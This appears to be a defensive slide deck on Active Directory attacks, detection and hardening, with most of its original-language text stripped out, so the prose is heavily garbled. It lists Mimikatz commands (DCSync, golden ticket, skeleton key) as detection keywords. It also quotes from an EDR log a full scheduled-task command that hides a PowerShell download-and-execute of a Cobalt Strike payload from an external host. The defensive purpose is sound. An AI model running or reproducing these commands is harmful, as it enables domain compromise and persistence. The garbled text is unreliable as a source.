AD
 


CONTENTS

1  2  3 

Active Directory
 ""      Windows 2000/XP  AD

Active Directory   ""
""              




Headoffice.domain.cn  Computers Computer1
Users User1
 Users User2 Printers Printer1


 

 
 **********


CONTENTS

1  2  3 

AD
 2018ADExchangeDC30 ADWindows C&CWindows Update 
AD

- SYSVOLGPP
 SYSVOL 
 SYSVOLvbsps1 



- SYSVOLGPP
   
 xml  AES 256





- SYSVOLGPP
 GPPKB2962486  
 AdministratorLAPS  AdministratorAdministrator
LAPS https://adsecurity.org/?p=1790 


- MS14-068
 Kerberos  TGT10TGT
 PTT  CVE-2014-6324KDCkerberos
  MS14-068KB3011780
1.ClientKDCTGTTicket Granting TicketAuthentication Service Exchange 2.ClientTGTDKC ServerTicket- Ticket Granting Service Exchange 3.ClientServer Ticket- Client/Server Exchange


- Kerberoast
 Active DirectorySPN Kerberos 
 TGT DCSPNSPN Kerberos RC4_HMAC_MD5NTLM TGSHASHKerberoast


- Kerberoast
  1AS-REQKDCKey Distribution Centre  2KDCTGTTicket-Granting Ticket  3IISTicket Granting ServiceTGTSPN Service Principal Name 4TGTTGS  5TGS 6 Windows TGS


- Kerberoast
 SPN "SPNKerberosSPN "SPN WindowsSPNSERVICE/host.name  LDAPSPN
KerberosLOCAL SYSTEMSMB  TGS-REPLABiis_svc




Kerberoasting
1.  servicePrincipalName 
2.  
3.   

- Kerberoast
 Kerberoast 25   Kerberoast Windows Server 2008Windows VistaKerberos AES128 256Windows KerberosAES Kerberos RC4   1Kerberos RC4 0x17 2Kerberos RC4 Kerberos DESID 476847690x1 0x20x3Windows 7Windows Server 2008 R2DES 


-
     
  
  1 2Dumphash 3pass the hash  4hash 5hash  6CMECrackMapExec  Office   


-
 ARPDHCP 
 hostsDNS DNSDNSVista LLMNRDNSLLMNRNet-BIOS NBT-NS 
 WPADWeb DHCPDNSURLDHCPDNS LLMNRNBNS


-
 SMB\\IP\FileSMB SMB Hashcat 
  1SMB 2docUNC  3PDFGoTobeGoToRPDFSMB  
 https://osandamalith.com/2017/03/24/places-of-interest-in-stealingnetntlm-hashes
  MACLLMNRNetBIOS
SMBWPADDNS


-
  
  Password Spraying
    5 4
  ID4625  ID4776



-AD
 HASH   1MimikatzHASH(lsadump::lsa /patch) 2DCSynclsadump::dcsync 3ntds.dit 4ntds.ditntds.dit  DSInternal 
HASH MimikatzPTH-



 ADkrbtgtDSRMSID HistoryAdminSDHolder  krbtgt  TGTKDCTicketkrbtgtHash
krbtgtHashTicket Ticketkrbtgthash Golden TicketPTT   krbtgt



 krbtgtHASH  Mimikatz kerberos::goldenkrbtgt HASH 
 DCSync 










   (Silver Tickets)KerberosTGS
AS-REQ AS-REPTGS-REQTGSREP   HASHHASH   TGS 



DSRM 
 krbtgtDSRM DC 
 DSRM   DSRM
HKLM\System\CurrentControlSet\Control\Lsa\DSRMAdminLogonBehavior DSRMAdminLogonBehavior2DC  HASHPTHDC
  DSRM
DSRMAdminLogonBehavior



SID History  SIDSID
SID500SID    ADSID HistorySID History   SID HistoryDomainA  DomainA SIDDomainA SID 512 Domain Admins  4738SID  SID History

test1SID History


   ADGPO
ADDCOU    905
  
  LAPS
LAPS



   SYSVOL  AD
SYSVOLSYSVOL  HASH  ADDefault Domain Policy DCDefault Domain Controllers PolicyUUIDSYSVOL 



AdminSDHolder  AdminSDHolderSystem
AdminSDHolder  AdminSDHolder""
  60SDProp  AD

AdminSDHolder

 Domain Admins


SSP
 SSPSecurity Support Provider DLLNTLMKerberos NegotiateCredential 
 SSP lsass.exeLSA  dll lsass.exe
 Mimikatz mimilib.dll mimilib.dllSecurity Packages  
 SYSVOL  


SSP


Skeleton Key  SSPMimikatzskeleton key
misc::skeleton  HASHPTHMimikatz

Skeleton Key



Skeleton Key


PasswordChangeNofity  SSPSkeleton KeyMimikatz
Hook PasswordChangeNotify  LSAPasswordFilter
PasswordChangeNotifyHook PasswordChangeNofityLSA  SYSVOL HTTPDNS



CONTENTS

1  2  3 


  office  
Exchange OWAEWSDNSDHCPRPC    EDR   EDR


- Mimikatz-

  ID  
 

Windows  SysmonSkylar 1skylaredr-process_running Process creationEDR (privilege::debug lsadump::dcshadowkerberos::goldenkerberos::goldenInvoke-Mimikatz)
 SysmonEDR



--

  ID  
 

Windows  SysmonSkylar 1skylaredr-process_running Process creationEDR (wmic os get /formatcsc /unsafe regsvr32.exe scrobj.dllIEX Net-Object .DownloadString)  SysmonEDR



--

  ID  
 

Windows  SysmonSkylar 1skylaredr-process_running Process creationEDR (activate instance ntdsset dsrm password)  SysmonEDR



- PowerShell-
 Windows PowerShellSysmon  PowerShellMicrosoft-Windows-PowerShell/Operational ID 800410341041skylaredr-process_running  Windows PowerShell    (IEX DownloadString    PowerShell


--

  ID     

Windows  Sysmon 10
1010winlogon.exelsass.exe  



- EDR
   C:/Windows/Sysnative/cmd.exe /C schtasks /create /tn "Windows
Update Task" /tr "powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c /"IEX ((new-object net.webclient).downloadstring(///"https://ns.qianxin.net:8443 /update'///"))/"" /sc onlogon /ru System /f  https://ns.qianxin.net:8443/update   
 Cobalt Strike payloadPDNSIP IP


AD
   
    AD  



  ADAD
  RAID
  
BitLocker
  DNS  AD  DCWindows Server 2016AD
Windows 10  KVM
    DSRM
NTDSUTILset dsrm password



  DC-  DCSecurity-  DCSysmon-  EDR-
  -  DACL-  -  DCwindows-MS14-068MS17-010
  Exchangewindows-ExchangeSSRF  LDAP enforce signing-LDAP relay  SMB-SMB-Relay  WPAD-LLMNR/NBT Poisoning


AD
 AD 
 ADADAD 
 ADAD AD
 AD  AD  ADXXADAdminYYXXYY
  
    


AD-Bloodhund
Admin DCOM



  AD Default Domain Controllers
  200MB500MB 
 " "  %Systemroot%\System32\wi nevt\logs   

    DS  /

 

   Kerberos   Kerberos          DPAPI   
 RPC   PNP (WS2016) Audit Token Right Adjusted(WS2016)        /   /WS2012/2016  IPsec   IPsec   IPsec 
(WS2016)     
       SAM      MPSSVC 
   

             
                
                 
   






 12  
 AD  
1  2""""  3AD   ID

 

 

ID 1105 1102 4720 4722 4723 4724 4725 4726 4738 4740 4767 4768 4771 4781 4794 4741 4743 4719 4624 4625 4776 4777

            Kerberos  Kerberos    AD        

ID




   1 dsquery.exe * forestroot -attr "cn" "distinguishedName" "dNSHostName" "whenCreated""whenChanged"filter"(&(objectclass=server)(objectcategory=server))" -q -L limit 0 dNSHostNameIP 2 dsquery.exe * -attr "sAMAccountName" "sAMAccountType" "userPrincipalName" "userAccountControl" "objectCategory" "member" "lastLogon" "whenCreated" "whenChanged" "description" -filter "(&(objectSid=S-1-5-32-544))" -q -L -limit 0 ADEnterprise AdminsEA Domain AdminsDA Built-in AdministratorsBAS-1-5-32-544SID   SOCCASE



   Nmapsmb-brute.nseSMB SOC CASE ldap-brute.nse  AD  MimikatzPowerShell  
    SPNKerberoast  https://adsecurity.org/?p=3513



     1  2ADBIOSPEBitLockervmdk  3Windows Server 2016 Credential GuardShielded VMTPM TPM   1ADSSO SSOSSOADKerberos LDAP 2C/SWebSSOLDAP SSL



 krbtgt  DSRM    SIDHistory  SYSVOL  AdminSDHolder  DC





    
  :
2019  ""
 1 +  2018 

 CISSPCISACBCP  CCSEJNCIS  ITILPrince2 Practice  2016 ()
DRI China  2014   2018 



  ·  ·  ·  · CBSCA · FWGTMLTM TokenSOCSOMIPS/IDSSCCM · CBS · SOCSOM ·  ·  · ISO27001ISO20000 
  ·  ISO27001
  · ITIL  ·  










 AD 
  https://adsecurity.org
 
 AD 
     

 niejun2002@gmail.com

 



THANKS!
 

